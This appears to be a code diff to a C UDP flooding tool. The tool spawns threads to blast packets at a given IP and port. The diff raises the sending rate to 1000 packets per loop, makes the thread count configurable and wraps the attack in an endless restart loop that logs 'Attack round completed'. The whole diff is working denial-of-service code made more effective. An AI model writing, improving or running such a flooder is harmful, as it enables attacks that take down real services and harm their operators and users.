@@ -7,6 +7,7 @@
 #include <time.h>
 
 #define BUFFER_SIZE 9000
+#define MAX_THREADS 20   // Set to 1 or 2 for fewer threads
 
 // Global variables
 char *ip;
@@ -40,13 +41,15 @@ void *send_udp_traffic(void *arg) {
     time_t start_time = time(NULL);
     time_t end_time = start_time + duration;
 
+    // Increase the packet sending rate
     while (time(NULL) < end_time) {
-        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
-                            (struct sockaddr *)&server_addr, sizeof(server_addr));
-        if (sent_bytes < 0) {
-            perror("Send failed");
-            close(sock);
-            pthread_exit(NULL);
+        for (int i = 0; i < 1000; i++) {  // Send multiple packets per loop
+            sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
+                                (struct sockaddr *)&server_addr, sizeof(server_addr));
+            if (sent_bytes < 0) {
+                perror("Send failed");
+                break;  // Break on send failure
+            }
         }
     }
 
@@ -64,18 +67,28 @@ int main(int argc, char *argv[]) {
     port = atoi(argv[2]);
     duration = atoi(argv[3]);
 
-    const int threads = 20;
-    pthread_t tid[threads];
-
-    for (int i = 0; i < threads; i++) {
-        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
-            perror("Thread creation failed");
-            exit(EXIT_FAILURE);
-        }
+    // Check for valid port number
+    if (port < 1 || port > 65535) {
+        fprintf(stderr, "Invalid port number. Must be between 1 and 65535.\n");
+        exit(EXIT_FAILURE);
     }
 
-    for (int i = 0; i < threads; i++) {
-        pthread_join(tid[i], NULL);
+    pthread_t tid[MAX_THREADS];
+    while (1) {  // Loop to restart the attack
+        for (int i = 0; i < MAX_THREADS; i++) {
+            if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
+                perror("Thread creation failed");
+                exit(EXIT_FAILURE);
+            }
+        }
+
+        for (int i = 0; i < MAX_THREADS; i++) {
+            pthread_join(tid[i], NULL);
+        }
+
+        // Log completion of this round
+        printf("Attack round completed. Restarting...\n");
+        sleep(1); // Optional delay between rounds
     }
 
     return 0;
